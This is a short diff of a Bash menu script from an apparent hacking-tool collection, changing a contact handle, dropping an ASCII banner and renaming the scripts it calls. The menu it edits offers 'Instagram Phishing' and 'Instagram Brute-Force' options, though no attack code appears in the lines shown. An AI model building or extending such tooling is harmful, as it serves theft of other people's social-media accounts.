@@ -1,21 +1,10 @@
 #!/bin/bash|
 #Code:Serhat Türk
 #Türk Siber Timi
-#İnstagram : @anonyms
+#İnstagram : @_serhatc
 #Youtube : Serhat Türk
 
 clear
-
-echo -e '\033[32;40;1m
-        /\︵-︵/\
-        |( ◉)(◉)|
-        \ ︶V︶ /
-        /↺↺↺↺↺↺↺\
-        ↺↺↺↺↺↺↺↺|
-        \↺↺↺↺↺↺↺/
-        ¯¯/\¯/\¯¯ '
-
-
 
 echo -e "\033[31;40;1m
 \033[31;40;1m[01]\e[37mİnstagram Phishing          \033[31;40;1m[02]\e[37mİnstagram Brute-Force
@@ -60,12 +49,12 @@ elif [[ $islem == 3 || $islem == 03 ]]; then
 elif [[ $islem == 00 ]]; then
 	cd ..
 	cd ..
-	bash tst.sh
+	bash hasaki.sh
 
 
 else
 	echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
 	sleep 2
 	clear
-	bash start.sh
+	bash hasaki.sh
 fi
